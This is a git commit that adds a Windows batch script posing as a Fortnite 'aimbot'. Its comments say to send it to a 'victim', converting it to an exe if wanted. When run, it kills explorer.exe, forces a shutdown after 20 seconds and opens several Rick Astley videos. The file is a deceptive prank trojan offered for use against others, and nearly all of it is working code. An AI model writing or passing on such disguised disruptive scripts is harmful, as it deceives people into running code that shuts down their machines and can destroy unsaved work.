c9f01cbd1b6e6d4e8a40a5adbac265bbd146a75a
CR4SH3D <63345758+crashixx@users.noreply.github.com>
2022-06-17 15:41:51 +0200

    Add files via upload

---
+++ A1MB00T.bat
@@ -0,0 +1,19 @@
+rem A1MB00T is a very simple .bat rickroll by CR4SH3D. Very convenient to troll Fortnite SKIDOO
+rem Usage : Download A1MB00T.bat (possibility to convert it to exe after the download), send it to your victim and enjoy !
+
+@echo off
+title A1MB00T
+color 4f 
+echo PRESS ENTER TO ACTIVATE FORNYTE A1MB00T !
+pause
+cls
+echo you've been rickrolled !
+taskkill /f /im explorer.exe
+shutdown -s -t 20
+cmd /C start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
+cmd /C start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
+cmd /C start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
+cmd /C start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
+cmd /C start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
+cmd /C start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
+
